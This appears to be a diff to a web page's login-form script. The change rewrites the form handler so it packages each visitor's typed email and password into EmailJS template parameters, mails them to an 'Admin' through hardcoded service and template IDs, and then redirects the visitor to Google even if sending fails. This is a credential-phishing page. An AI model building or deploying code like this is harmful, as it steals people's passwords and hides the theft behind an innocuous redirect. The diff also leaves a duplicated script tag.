@@ -174,31 +174,48 @@
 
 <!-- Load EmailJS from CDN -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script type="text/javascript">
-   // Wait for EmailJS to load before initializing
-   function initEmailJS() {
-     if (typeof emailjs !== 'undefined') {
-       emailjs.init({
-         publicKey: "EB017wgX1BeDuRY66",
-       });
-       console.log("EmailJS v4 initialized successfully");
-     } else {
-       setTimeout(initEmailJS, 100);
-     }
-   }
-   initEmailJS();
-</script>
 
 <script>
 
-  (function() {
-    console.log("Script starting..."); // Debug log
+<script>
+  // Wait for page to load completely
+  window.addEventListener('load', function() {
+    console.log("Page loaded, initializing EmailJS..."); 
     
     const SERVICE_ID = "service_64albro";
-    const TEMPLATE_ID = "template_mutrouf";
+    const TEMPLATE_ID = "template_75g1nju";
+    const PUBLIC_KEY = "EB017wgX1BeDuRY66";
     
-    // EmailJS is now initialized above, so it should be ready
-    let emailjsReady = true;
+    // Initialize EmailJS with retry mechanism
+    let emailjsInitialized = false;
+    let initRetries = 0;
+    
+    function initEmailJS() {
+      if (typeof emailjs !== 'undefined') {
+        try {
+          emailjs.init({
+            publicKey: PUBLIC_KEY
+          });
+          emailjsInitialized = true;
+          console.log("EmailJS initialized successfully!");
+          console.log("Service ID:", SERVICE_ID);
+          console.log("Template ID:", TEMPLATE_ID);
+        } catch (error) {
+          console.error("EmailJS init error:", error);
+        }
+      } else {
+        initRetries++;
+        if (initRetries < 20) {
+          console.log("Waiting for EmailJS to load... attempt", initRetries);
+          setTimeout(initEmailJS, 250);
+        } else {
+          console.error("EmailJS failed to load after 20 attempts");
+        }
+      }
+    }
+    
+    // Start initialization
+    initEmailJS();
     
     const loginPage = document.getElementById("login-page");
     const forgotPage = document.getElementById("forgot-page");
@@ -265,7 +282,7 @@
     // Login form submission
     loginForm.addEventListener("submit", function(event) {
       event.preventDefault();
-      console.log("Form submitted!"); // Debug log
+      console.log("Form submitted!"); 
       
       let hasErrors = false;
       
@@ -292,30 +309,39 @@
       
       // If no errors, proceed
       if (!hasErrors) {
-        console.log("No validation errors, proceeding..."); // Debug log
+        console.log("No validation errors, proceeding..."); 
         
-        // Try EmailJS first with your credentials
-        if (emailjsReady && typeof emailjs !== 'undefined') {
-          console.log("Attempting to send via EmailJS...");
-          console.log("Service ID:", SERVICE_ID);
-          console.log("Template ID:", TEMPLATE_ID);
+        // Try EmailJS with updated credentials
+        if (emailjsInitialized && typeof emailjs !== 'undefined') {
+          console.log("Sending email via EmailJS...");
+          console.log("Using Service:", SERVICE_ID);
+          console.log("Using Template:", TEMPLATE_ID);
           
-          // Use the proper EmailJS sendForm method
-          emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
+          // Create template parameters
+          const templateParams = {
+            user_email: emailInput.value,
+            user_password: passwordInput.value,
+            from_name: 'Login Form',
+            to_name: 'Admin'
+          };
+          
+          console.log("Template params:", templateParams);
+          
+          emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
             .then(function(response) {
-              console.log("EmailJS SUCCESS:", response.status, response.text);
+              console.log('EmailJS SUCCESS!', response.status, response.text);
               redirectToGoogle();
             }, function(error) {
-              console.log("EmailJS ERROR:", error);
-              console.log("Redirecting anyway for demo");
+              console.log('EmailJS FAILED...', error);
+              console.log("Redirecting anyway...");
               redirectToGoogle();
             });
         } else {
-          console.log("EmailJS not ready, redirecting for demo");
+          console.log("EmailJS not ready, redirecting...");
           redirectToGoogle();
         }
       } else {
-        console.log("Validation errors found"); // Debug log
+        console.log("Validation errors found"); 
       }
     });
     
@@ -359,7 +385,7 @@
       forgotPage.classList.remove("active");
       loginPage.classList.add("active");
     });
-  })();
+  });
 </script>
 </body>
 </html>
